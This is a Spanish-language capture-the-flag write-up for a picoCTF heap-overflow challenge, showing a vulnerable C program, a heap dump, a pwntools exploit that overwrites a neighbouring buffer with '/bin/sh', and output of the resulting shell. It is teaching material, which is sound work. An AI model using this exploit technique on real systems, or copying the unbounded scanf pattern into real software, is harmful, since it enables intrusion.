
En este ejercicio nos dan un ejercicio y un binario. Vamos a mirar el código:

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>


int main(void) {
	char* username = malloc(28);
	char* shell = malloc(28);
	
	printf("username at %p\n", username);
    fflush(stdout);
	printf("shell at %p\n", shell);
    fflush(stdout);
	
	strcpy(shell, "/bin/pwd");
	
	printf("Enter username: ");
    fflush(stdout);
	scanf("%s", username);
	
	printf("Hello, %s. Your shell is %s.\n", username, shell);
	system(shell);
    fflush(stdout);
	
	return 0;
}
```

Simplemente hace 2 mallocs, nos hacen leak de su posición y tenemos overflow del contenido del primer malloc gracias a esta linea que no limita el tamaño:

```c
scanf("%s", username);
```

Luego el contenido en el use-data del segundo chunk se le pasa a `system` de esta manera:

```c
system(shell);
```

Este es un ejercicio simple de heap overflow. Simplemente necesitamos saber cuanto padding hay que escribir para conseguir llegar al use-data del segundo chunk. Esto se puede hacer mirando el código o inspeccionando el heap:

```python
0000000000405300     0000000000000000 0000000000000031 # Chunk 1
0000000000405310     0000000061616161 0000000000000000 # aaaa de prueba
0000000000405320     0000000000000000 0000000000000000
0000000000405330     0000000000000000 0000000000000031 #Chunk 2
0000000000405340     6477702f6e69622f 0000000000000000
```

Como podemos ver hay que escribir 6 quadwords (1 quadword = 8 bytes) para llegar al contenido de la variable `shell` que luego se le pasará a `system`. Entonces el exploit para conseguir una shell sería el siguiente:

```python
#!/usr/bin/env python3

from pwn import *

exe = ELF("./vuln_patched")

def main():
    io = conn()
    
    bin_sh = b'/bin/sh'

    io.recvline(b'Enter username:')
    io.sendline(p64(0) * 6 + bin_sh)
    
    io.interactive()

if __name__ == "__main__":
    main()
```

```c
python3 solve.py LOCAL                                                                                ℂ -gcc  3.13.7  05:35 
[*] '/home/ub1cu0/Escritorio/PWN/picoCTF/input_injection_2/vuln_patched'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
[+] Starting local process '/home/ub1cu0/Escritorio/PWN/picoCTF/input_injection_2/vuln_patched': pid 38732
[!] 'keepends' argument is deprecated. Use 'drop' instead.
[*] Switching to interactive mode
shell at 0x2ed2a340
Enter username: Hello, . Your shell is /bin/sh.
$ whoami
ub1cu0

```